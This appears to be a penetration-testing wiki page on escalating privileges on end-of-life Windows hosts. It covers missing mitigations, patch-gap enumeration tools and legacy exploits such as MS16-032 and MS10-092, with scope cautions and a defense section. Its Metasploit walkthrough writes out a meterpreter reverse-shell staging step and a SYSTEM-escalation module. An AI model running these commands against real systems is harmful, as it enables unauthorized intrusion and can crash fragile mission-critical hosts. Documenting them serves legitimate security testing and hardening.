@@ -1,0 +1,120 @@
+---
+title: End-of-Life & Legacy Systems
+description: Escalating on unsupported Windows (Server 2008/2008 R2, Windows 7, and older) - why the absence of modern mitigations (Credential Guard, Device Guard/WDAC, AppLocker, CFG) makes these hosts soft targets, the legacy-specific enumeration tools (Sherlock, Windows-Exploit-Suggester, JAWS), the signature local-exploit CVEs (MS10-092 schelevator, MS16-032 Secondary Logon, MS16-075 potato), and the operational caution that matters most here - legacy boxes are often fragile, mission-critical, and must not be crashed.
+mitre: [T1068, T1210]
+d3fend: [D3-SU, D3-NI]
+impact: [PrivEsc, SystemCompromise]
+owasp: []
+noise: loud
+sidebar:
+  order: 20
+  label: Legacy / EOL systems
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+End-of-life Windows - Server 2008/2008 R2, Windows 7, and anything older - no longer receives security updates, so it accumulates unpatched local-privilege-escalation and RCE flaws. It's also missing the mitigations that make modern hosts hard (Credential Guard, Device Guard/WDAC, AppLocker, Control Flow Guard), so escalation is usually quicker and the public PoCs just work. You'll meet these in hospitals, universities, government, manufacturing, and retail POS fleets.
+
+```
+# Legacy-specific missing-patch enumeration (older tooling, PS2.0-friendly)
+Import-Module .\Sherlock.ps1; Find-AllVulns         # on-host, flags "Appears Vulnerable"
+python2.7 windows-exploit-suggester.py --systeminfo si.txt --database 2021-05-13-mssb.xls   # use the dated file --update prints
+# then the signature legacy LPE PoCs, e.g.:
+Import-Module .\Invoke-MS16-032.ps1; Invoke-MS16-032   # Secondary Logon → SYSTEM (Win7/2008)
+```
+
+Success indicator: `whoami` → `nt authority\system` via a legacy kernel/service CVE - but **only after** you've confirmed with the client that the host can tolerate it (see the caution below).
+
+<Aside type="caution">
+Legacy hosts are disproportionately **fragile and mission-critical** - the reason they weren't upgraded is often that they run irreplaceable software (an MRI console, a POS controller, a line-of-business app from a defunct vendor). Kernel LPE PoCs against these can bluescreen or hang them. **Always confirm scope with the client before exploiting a legacy host**, prefer the gentlest confirmed-vulnerable path, and treat "don't crash it" as a hard constraint. The right finding is often network segmentation and a decommission plan, not just "we got SYSTEM."
+</Aside>
+
+## Why legacy is softer
+
+The missing-patch surface is the obvious part, but the bigger difference is the mitigations that simply **aren't there** on older OSes. Each absence re-enables a technique the rest of this cluster has to work around on a modern host:
+
+| Mitigation | Win7 / 2008 R2 | Win10 / 2016+ | What its absence gives you |
+| --- | --- | --- | --- |
+| Credential Guard | ✗ | ✓ | LSASS holds reusable secrets; WDigest plaintext passwords on by default pre-8.1 |
+| Device Guard / WDAC / HVCI | ✗ | ✓ | No hardware-enforced code-integrity or application control (x64 *driver signing* is still enforced - it dates to Vista - but there's no HVCI/WDAC policy gating what runs) |
+| AppLocker | partial | ✓ | Little to no application allowlisting - drop and run tools freely |
+| Control Flow Guard | ✗ | ✓ | Memory-corruption kernel exploits are far more reliable |
+| Windows Defender | partial | ✓ | Public PoCs and tooling often run unsignatured |
+
+So on legacy you can usually dump credentials straight from LSASS (see [credential hunting](/codex/windows/privesc/credential-hunting/) and the LSASS route on [SeDebugPrivilege](/codex/windows/privesc/sedebugprivilege/)), run token-impersonation "potato" attacks unimpeded, and fire kernel PoCs that CFG would otherwise break.
+
+## Enumerating legacy for missing patches
+
+The [missing-patch → CVE workflow](/codex/windows/privesc/kernel-exploits/#confirming-the-patch-gap) is the same as for modern hosts. **[WES-NG](https://github.com/bitsadmin/wesng) is still the primary matcher** - it covers Windows XP through 11 and their Server counterparts, so it suits legacy hosts too; use it first. The older legacy-era tools are supplementary, useful as a second opinion or when you specifically want their on-host checks:
+
+- **[Sherlock](https://github.com/rasta-mouse/Sherlock)** - on-host PowerShell; `Find-AllVulns` checks a built-in set of older LPE bulletins and prints `Appears Vulnerable` / `Not Vulnerable` / `Not supported on 64-bit systems` per CVE. Handy quick first pass on 2008/Win7 without exporting `systeminfo`.
+- **[Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)** (the *original*, superseded by WES-NG) - off-host Python; `--update` pulls the MS bulletin DB, then feed it `systeminfo` output. Note its bulletin data is **frozen at Q1 2017**, so it misses anything newer even on Win7/2008 - treat it as a legacy supplement, not a replacement for WES-NG.
+- **[JAWS](https://github.com/411Hall/JAWS)** - PowerShell 2.0-compatible, for hosts too old for modern scripts.
+- The **Metasploit local exploit suggester** (`post/multi/recon/local_exploit_suggester`) against an existing session shortlists usable modules fast.
+
+```
+wmic qfe                                    # last installed KB - google it; legacy hosts are often years behind
+Import-Module .\Sherlock.ps1; Find-AllVulns
+```
+
+Filter the output hard: drop DoS entries and anything `Not Vulnerable` / not matching the architecture (many Win32k PoCs are `Not supported on 64-bit systems`).
+
+## Signature legacy LPE exploits
+
+A handful recur constantly on 2008/Win7:
+
+- **MS10-092 - Task Scheduler `.XML` (schelevator)** - the scheduler trusts a CRC-protected task XML it doesn't properly validate; Metasploit `exploit/windows/local/ms10_092_schelevator` rewrites a task to run as SYSTEM. Reliable on Vista/7/2008.
+- **MS16-032 - Secondary Logon handle** - a leaked thread handle in `seclogon`; the `Invoke-MS16-032.ps1` PowerShell PoC races it into a SYSTEM shell. Works Win7-10 / 2008-2012, no binary drop needed.
+- **MS16-075 - NTLM reflection (the "potato" family)** - Hot/RottenPotato reflect a coerced SYSTEM NTLM auth back to the local host. This is the ancestor of the modern potato attacks on [SeImpersonate](/codex/windows/privesc/seimpersonate/#how-the-potato-attacks-work); on legacy it often works from any service account without the newer prerequisites.
+- **MS10-015 (KiTrap0D)** and **MS08-067** - ancient but still found on XP/2003/2000; KiTrap0D is 32-bit-only, MS08-067 is a wormable RCE that doubles as a foothold.
+
+### Worked flow (Server 2008 → SYSTEM)
+
+A typical Metasploit path when you have a foothold shell:
+
+msfconsole runs one command per line (it does **not** split on `;`), so each line below is its own command.
+
+```
+# 1. stage a meterpreter session with smb_delivery: configure, run, then execute the
+#    one-liner it prints on the target, and interact with the session it creates.
+use exploit/windows/smb/smb_delivery
+set target 0
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <you>
+exploit
+#   → prints:  rundll32.exe \\<you>\<share>\test.dll,0   ← run that in the foothold shell on the target
+#   → "Meterpreter session 1 opened"
+sessions -i 1
+
+# 2. migrate to an x64 process FIRST (many modules fail from a 32-bit SysWOW64 host), then background
+ps
+migrate <x64_pid>
+background
+
+# 3. run the LPE module against session 1 - set a meterpreter payload explicitly, because
+#    schelevator's default dropper target otherwise gives a plain shell, not meterpreter.
+use exploit/windows/local/ms10_092_schelevator
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <you>
+set LPORT 4443
+exploit
+#   → new session as NT AUTHORITY\SYSTEM
+```
+
+If a module's safety check wrongly reports "not vulnerable" but Sherlock/WES say otherwise, `set ForceExploit true` overrides it - use that only when you're confident and the host can take it.
+
+## Defense
+
+- **Patch or retire** is the real fix - but where an EOL host genuinely can't be replaced (vendor gone, certified medical/industrial software), that's a business decision, not a finding to dismiss. Report it with context.
+- **Network-segment** EOL systems aggressively: isolate them on their own VLAN with strict ACLs so a compromise can't spread (these are exactly the hosts wormable flaws like EternalBlue/SIGRed devastate). Microsoft custom ESU contracts can keep critical patches flowing in the meantime.
+- Restrict inbound/outbound to the minimum the legacy app needs; disable SMBv1 and legacy protocols; monitor the segment heavily since the host itself can't defend.
+- Treat a legacy host as already-credential-exposed: assume LSASS secrets are recoverable, so don't let privileged/domain accounts log on to it.
+
+## Related
+
+- [Kernel exploits](/codex/windows/privesc/kernel-exploits/) - the general missing-patch-to-CVE workflow; legacy is the same method with older tooling and a softer target
+- [Initial enumeration](/codex/windows/privesc/initial-enumeration/#systeminfo) - capturing the `systeminfo`/`wmic qfe` output these matchers consume
+- [SeImpersonate](/codex/windows/privesc/seimpersonate/) - the modern descendants of the MS16-075 potato attacks
+- [SeDebugPrivilege](/codex/windows/privesc/sedebugprivilege/) / [Credential hunting](/codex/windows/privesc/credential-hunting/) - dumping the plaintext credentials legacy LSASS gives up without Credential Guard
